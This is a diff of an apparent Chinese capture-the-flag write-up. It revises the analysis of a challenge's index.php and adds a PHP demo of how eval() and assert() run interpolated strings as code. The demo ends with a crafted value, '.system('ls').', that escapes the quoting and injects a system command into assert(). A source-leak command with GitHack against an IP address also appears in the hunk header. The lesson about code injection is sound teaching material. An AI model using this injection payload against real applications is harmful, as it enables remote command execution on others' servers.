@@ -3939,7 +3939,44 @@ python /Users/lixiaolong/tools/GitHack/GitHack.py http://111.198.29.45:54372/.gi
 </td></tr></table>
 
 </details>
-<p>审计源码发现<code>flag.php</code>为空, <code>index.php</code>中使用<code>strpos()</code>对<code>$page</code>校验<code>..</code></p>
+<p>审计源码发现<code>flag.php</code>为空, <code>index.php</code>中使用<code>assert()</code>对<code>$page</code>校验<code>..</code></p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="s2">&quot;abc&quot;</span><span class="p">;</span>
+<span class="c1">// abc, 字符串携带变量作为方法参数, 会被php语法解析</span>
+<span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;</span><span class="si">$a</span><span class="s2">&lt;/p&gt;&quot;</span><span class="p">;</span>
+<span class="c1">// 1, 获取字符串第一次出现的位置</span>
+<span class="k">echo</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="s1">&#39;bc&#39;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="c1">// 1, eval把字符串当做代码执行, 字符串中的变量同样会被解析</span>
+<span class="c1">// 被解析后需要加上&#39;&#39;</span>
+<span class="k">eval</span><span class="p">(</span><span class="s2">&quot;echo strpos(&#39;</span><span class="si">$a</span><span class="s2">&#39;, &#39;bc&#39;);&quot;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="c1">// assert也会把字符串当做代码执行, 字符串中的变量同样会被解析</span>
+<span class="nb">assert</span><span class="p">(</span><span class="s2">&quot;strpos(&#39;</span><span class="si">$a</span><span class="s2">&#39;, &#39;bc&#39;) === 1&quot;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;ok&lt;/p&gt;&quot;</span><span class="p">;</span>
+<span class="c1">// 构造恶意字符串, 截断&#39;&#39;</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="s2">&quot;&#39;.system(&#39;ls&#39;).&#39;&quot;</span><span class="p">;</span>
+<span class="nb">assert</span><span class="p">(</span><span class="s2">&quot;strpos(&#39;</span><span class="si">$a</span><span class="s2">&#39;, &#39;bc&#39;) === 1&quot;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</td></tr></table>
                 
                   
                 
